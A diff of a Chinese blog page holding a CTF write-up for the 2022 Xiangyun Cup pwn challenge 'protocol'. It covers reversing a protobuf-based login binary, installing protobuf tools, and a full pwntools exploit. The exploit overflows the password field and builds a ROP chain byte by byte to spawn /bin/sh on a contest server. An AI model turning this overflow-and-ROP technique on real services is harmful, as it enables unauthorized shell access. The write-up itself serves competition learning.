@@ -1,48 +1,153 @@
 <!DOCTYPE html>
-<html>
-    <head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
-    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
-    
-<link rel="stylesheet" href="/css/reset.css">
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    
-<link rel="stylesheet" href="/css/style.css">
+    <meta name="author" content="Loora1N">
 
-    
-<link rel="stylesheet" href="/css/markdown.css">
 
-    
-<link rel="stylesheet" href="/css/fonts.css">
 
-<meta name="generator" content="Hexo 6.2.0"></head>
-    <body>
-        <div class="paper">
-            <div class="paper-main">
-                
-                    <div class="post-header">
-    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
-    <a class="go-home" href="/">
-        <svg width="8" height="14" viewBox="0 0 8 14">
-            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-    </a>
+    <meta name="description" content="Blog of Loora1N">
+
+
+
+
+
+<title>【祥云杯2022】PWN-WriteUp-protocol | Loora1N&#39;s Blog | 鹭雨</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/menu.js"></script>
+    
+    <script src="/js/highlight.min.js"></script>
+    
+    <script src="/js/highlightjs-line-numbers.js"></script>
+    
+    <script src="/js/format.js"></script>
+    
+    <script src="/js/search.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.2.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Loora1N&#39;s Blog | 鹭雨
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">首页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">索引</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">述己</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/links/">友链</a>
+              </li> 
+                   
+          
+          
+            <li class="menu-item search-btn">
+              <a href="#">Search</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
 </div>
-                
-                <div class="post-main">
 
-    
-    
-        <div class="post-main-title">
-            【祥云杯2022】PWN-WriteUp-protocol
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
         </div>
-        <div class="post-meta">
-            2022-11-01
+        <div class="post-title">
+            
+            
+                【祥云杯2022】PWN-WriteUp-protocol
+            
+            
         </div>
-        <div class="post-md">
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次见到google protobuf类型的题目，虽然是到签到题，但还是学到了一些新的东西</p>
+        <span class="post-date">
+            11月 1, 2022
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次见到google protobuf类型的题目，虽然是到签到题，但还是学到了一些新的东西</p>
 <h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>首先导入文件，当我看到左侧密密麻麻的无名函数就感受到了一丝不对劲</p>
 <p><img src="/img/article/protocol/image-20221101210554873.png" alt="image-20221101210554873"></p>
 <p>先运行一下程序，发现输出了一个<code>Login:</code></p>
@@ -78,171 +183,126 @@
 <p><img src="/img/article/protocol/image-20221101212029433.png" alt="image-20221101212029433"></p>
 <h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>首先找到最新版本的protobuf：<a target="_blank" rel="noopener" href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a><br>我这里下载的是：protobuf-cpp-3.21.9.tar.gz</p>
 <p>下载并安装protobuf，注意需要<strong>root</strong>权限，且必须在root账户下操作，sudo+指令不太行</p>
-<pre><code class="shell">tar -xzvf protobuf-cpp-3.21.9.tar.gz
-cd protobuf-3.21.9
-./autogen.sh
-./configure --prefix=/usr/local/protobuf
-make -j8 &amp;&amp; make install
-ldconfig
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf protobuf-cpp-3.21.9.tar.gz</span><br><span class="line">cd protobuf-3.21.9</span><br><span class="line">./autogen.sh</span><br><span class="line">./configure --prefix=/usr/local/protobuf</span><br><span class="line">make -j8 &amp;&amp; make install</span><br><span class="line">ldconfig</span><br></pre></td></tr></table></figure>
+
 <p>安装完成之后，需要配置protobuf命令，更新环境变量</p>
-<pre><code class="shell"># 在/etc/profile文件中添加下面两行
-export PATH=$PATH:/usr/local/protobuf/bin/
-export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/
-# 然后执行
-source /etc/profile
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/etc/profile文件中添加下面两行</span></span><br><span class="line">export PATH=$PATH:/usr/local/protobuf/bin/</span><br><span class="line">export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后执行</span></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>
+
 <p>配置动态链接库</p>
-<pre><code class="shell"># 在文件/etc/ld.so.conf中添加下面一行
-/usr/local/protobuf/lib #（注意: 在新行处添加）
- 
-# 更改完成之后执行下面的命令
-ldconfig
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在文件/etc/ld.so.conf中添加下面一行</span></span><br><span class="line">/usr/local/protobuf/lib #（注意: 在新行处添加）</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更改完成之后执行下面的命令</span></span><br><span class="line">ldconfig</span><br></pre></td></tr></table></figure>
+
 <p>配置好相关环境后，按照如下操作，分解出了<code>ctf_pb2.py</code>和<code>ctf.proto</code>文件</p>
 <p>使用自动化工具分析提取.py文件：<a target="_blank" rel="noopener" href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p>
-<pre><code class="shell">pip3 install protobuf
-./extractors/from_binary.py [-h] input_file [output_dir] # 得到ctf.ptoto
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip3 install protobuf</span><br><span class="line">./extractors/from_binary.py [-h] input_file [output_dir] # 得到ctf.ptoto</span><br><span class="line"></span><br><span class="line">pip3 install google</span><br><span class="line">pip3 install protobuf</span><br><span class="line">protoc -I=./ --python_out=./ ctf.proto  # 得到ctf_pb2.py</span><br></pre></td></tr></table></figure>
 
-pip3 install google
-pip3 install protobuf
-protoc -I=./ --python_out=./ ctf.proto  # 得到ctf_pb2.py
-</code></pre>
 <p><img src="/img/article/protocol/image-20221101212237685.png" alt="image-20221101212237685"></p>
 <blockquote>
 <p>如果显示没有proto指令，可以安装protobuf-compiler后再次尝试</p>
 </blockquote>
-<pre><code class="shell">sudo apt-get install protobuf-compiler
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install protobuf-compiler</span><br></pre></td></tr></table></figure>
+
 <p>.proto文件里存放了message的结构信息</p>
 <p><img src="/img/article/protocol/image-20221101212357009.png" alt="image-20221101212357009"></p>
 <p>然后将py文件作为库导入，即可利用它的接口完成消息传递，我传递message的函数如下定义</p>
-<pre><code class="python">def new_pwn(payload):
-    global io
-    io.recvuntil(&#39;Login: &#39;)
-    person = pwn()
-    person.username = b&#39;admin&#39;
-    person.password = payload
-    io.send(person.SerializeToString())
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">new_pwn</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Login: &#x27;</span>)</span><br><span class="line">    person = pwn()</span><br><span class="line">    person.username = <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">    person.password = payload</span><br><span class="line">    io.send(person.SerializeToString())</span><br></pre></td></tr></table></figure>
+
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>综合上述分析，我们在送入password时存在溢出漏洞，但是ROP中的含有的<strong>\x00</strong>难以直接送入。但是我们可以利用while循环多次送入不同长度的字符串，使得字符串结尾添加的<strong>\x00</strong>被我们利用。同时需要注意的是，这种情况下，我们需要倒着一点一点写好ROP，**&#x2F;bin&#x2F;sh**的字符串我们可以在最后写入全局变量，只要记住对应地址即可，同时结束while循环调用ROP链。</p>
 <p><img src="/img/article/protocol/image-20221101214354465.png" alt="image-20221101214354465"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from ctf_pb2 import *
-from pwn  import *
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctf_pb2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn  <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_pwn</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Login: &#x27;</span>)</span><br><span class="line">    person = pwn()</span><br><span class="line">    person.username = <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">    person.password = payload</span><br><span class="line">    io.send(person.SerializeToString())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x248</span> + <span class="string">b&#x27;b&#x27;</span>*num + <span class="string">b&#x27;c&#x27;</span>*(<span class="number">8</span>-i)</span><br><span class="line">        new_pwn(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">mode,ip = <span class="string">&#x27;0.0.0.0&#x27;</span>,port = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./protocol&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(ip,port)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#0x0000000000403c99 : syscall</span></span><br><span class="line">    <span class="comment">#binsh</span></span><br><span class="line">    <span class="comment">#0x0000000000404982 : pop rdi ; ret</span></span><br><span class="line">    <span class="comment">#0</span></span><br><span class="line">    <span class="comment">#0x0000000000588bbe : pop rsi ; ret</span></span><br><span class="line">    <span class="comment">#59</span></span><br><span class="line">    <span class="comment">#0x00000000005bdb8a : pop rax ; ret</span></span><br><span class="line">    <span class="comment">#0</span></span><br><span class="line">    <span class="comment">#0x000000000040454f : pop rdx ; ret</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x248</span> +<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span> + <span class="string">b&#x27;\x99\x3c\x40&#x27;</span></span><br><span class="line">    new_pwn(payload)</span><br><span class="line">    </span><br><span class="line">    clear(<span class="number">0x38</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x248</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x38</span> + <span class="string">b&#x27;\x6f\xa3\x81&#x27;</span></span><br><span class="line">    new_pwn(payload)</span><br><span class="line">    </span><br><span class="line">    clear(<span class="number">0x30</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x248</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span> + <span class="string">b&#x27;\x82\x49\x40&#x27;</span></span><br><span class="line">    new_pwn(payload)</span><br><span class="line">    </span><br><span class="line">    clear(<span class="number">0x28</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x248</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">    new_pwn(payload)</span><br><span class="line">    </span><br><span class="line">    clear(<span class="number">0x20</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x248</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span> + <span class="string">b&#x27;\xbe\x8b\x58&#x27;</span></span><br><span class="line">    new_pwn(payload)</span><br><span class="line">    </span><br><span class="line">    clear(<span class="number">0x18</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x248</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\x3b&#x27;</span></span><br><span class="line">    new_pwn(payload)</span><br><span class="line">    </span><br><span class="line">    clear(<span class="number">0x10</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x248</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span> + <span class="string">b&#x27;\x8a\xdb\x5b&#x27;</span></span><br><span class="line">    new_pwn(payload)</span><br><span class="line">    </span><br><span class="line">    clear(<span class="number">0x8</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x248</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x08</span></span><br><span class="line">    new_pwn(payload)</span><br><span class="line">    </span><br><span class="line">    clear(<span class="number">0x0</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x248</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x00</span> + <span class="string">b&#x27;\x4f\x45\x40&#x27;</span></span><br><span class="line">    new_pwn(payload)</span><br><span class="line">    </span><br><span class="line">    pause()</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Login:&#x27;</span>)</span><br><span class="line">    person = pwn()</span><br><span class="line">    person.username = <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">    person.password = <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">    payload = person.SerializeToString() + <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp(<span class="number">1</span>,<span class="string">&#x27;210.30.97.133&#x27;</span>,<span class="number">28091</span>)</span><br></pre></td></tr></table></figure>
 
 
-context(os=&#39;linux&#39;, arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
-
-
-def new_pwn(payload):
-    global io
-    io.recvuntil(&#39;Login: &#39;)
-    person = pwn()
-    person.username = b&#39;admin&#39;
-    person.password = payload
-    io.send(person.SerializeToString())
-    
-def clear(num):
-    for i in range(1,8):
-        payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*num + b&#39;c&#39;*(8-i)
-        new_pwn(payload)
-
-
-def exp(mode,ip = &#39;0.0.0.0&#39;,port = 0):
-    global io
-    if mode == 0:
-        io = process(&#39;./protocol&#39;)
-    else:
-        io = remote(ip,port)
-    
-    #0x0000000000403c99 : syscall
-    #binsh
-    #0x0000000000404982 : pop rdi ; ret
-    #0
-    #0x0000000000588bbe : pop rsi ; ret
-    #59
-    #0x00000000005bdb8a : pop rax ; ret
-    #0
-    #0x000000000040454f : pop rdx ; ret
-    
-    payload = b&#39;a&#39;*0x248 +b&#39;b&#39;*0x40 + b&#39;\x99\x3c\x40&#39;
-    new_pwn(payload)
-    
-    clear(0x38)
-    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x38 + b&#39;\x6f\xa3\x81&#39;
-    new_pwn(payload)
-    
-    clear(0x30)
-    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x30 + b&#39;\x82\x49\x40&#39;
-    new_pwn(payload)
-    
-    clear(0x28)
-    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x28
-    new_pwn(payload)
-    
-    clear(0x20)
-    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x20 + b&#39;\xbe\x8b\x58&#39;
-    new_pwn(payload)
-    
-    clear(0x18)
-    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x18 + b&#39;\x3b&#39;
-    new_pwn(payload)
-    
-    clear(0x10)
-    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x10 + b&#39;\x8a\xdb\x5b&#39;
-    new_pwn(payload)
-    
-    clear(0x8)
-    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x08
-    new_pwn(payload)
-    
-    clear(0x0)
-    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x00 + b&#39;\x4f\x45\x40&#39;
-    new_pwn(payload)
-    
-    pause()
-    io.recvuntil(&#39;Login:&#39;)
-    person = pwn()
-    person.username = b&#39;admin&#39;
-    person.password = b&#39;admin&#39;
-    payload = person.SerializeToString() + b&#39;\x00&#39; + b&#39;/bin/sh\x00&#39;
-    io.send(payload)
-    
-    
-    io.interactive()
-
-if __name__ == &#39;__main__&#39;:
-    exp(1,&#39;210.30.97.133&#39;,28091)
-</code></pre>
-
-        </div>
-
-    
-
-</div>
-                <div class="footer">
-    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
-    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
-</div>
-
-
-<link rel="stylesheet" href="/css/a11y-dark.min.css">
-
-
-<script src="/js/highlight.min.js"></script>
-
-
-<script src="/js/highlightjs-line-numbers.js"></script>
-
+</div> 
 
 <script>
-    hljs.initHighlightingOnLoad();
-    hljs.initLineNumbersOnLoad();
+    window.onload = detectors();
 </script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2022/11/03/i%E6%98%A5%E7%A7%8B%E6%98%A5%E5%AD%A3%E8%B5%9B-%E5%8B%87%E8%80%85%E5%B7%85%E5%B3%B0-chunqiuIOT/">Prev</a>
+                </div>
+            
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2022/10/28/%E9%80%82%E7%94%A8%E5%A4%9A%E7%89%88%E6%9C%AClibc%E7%9A%84pwn-base/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
 
+    
+      <div class="post-comment">
+
+     
+
+     
+    
+    
+
+</div>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+    
+      <div class="search-popup">
+    <div class="search-popup-overlay">  
+    </div>
+    <div class="search-popup-window" >
+        <div class="search-header">
+            <div class="search-input-container">
+              <input autocomplete="off" autocapitalize="off" maxlength="80"
+                     placeholder="Search Anything" spellcheck="false"
+                     type="search" class="search-input">
+            </div>
+            <div class="search-close-btn">
+                <div class="icon close-btn"></div>
             </div>
         </div>
-    <!-- hexo injector body_end start -->
+        <div class="search-result-container">
+        </div>
+    </div>
+</div>
+
+<script>
+    const searchConfig = {
+        path             : "/search.xml",
+        top_n_per_article: "1",
+        unescape         : "false",
+        trigger: "auto",
+        preload: "false"
+    }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+<script src="/js/search.js"></script>
+    
+    
+
+  <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
         function GithubCalendarConfig(){
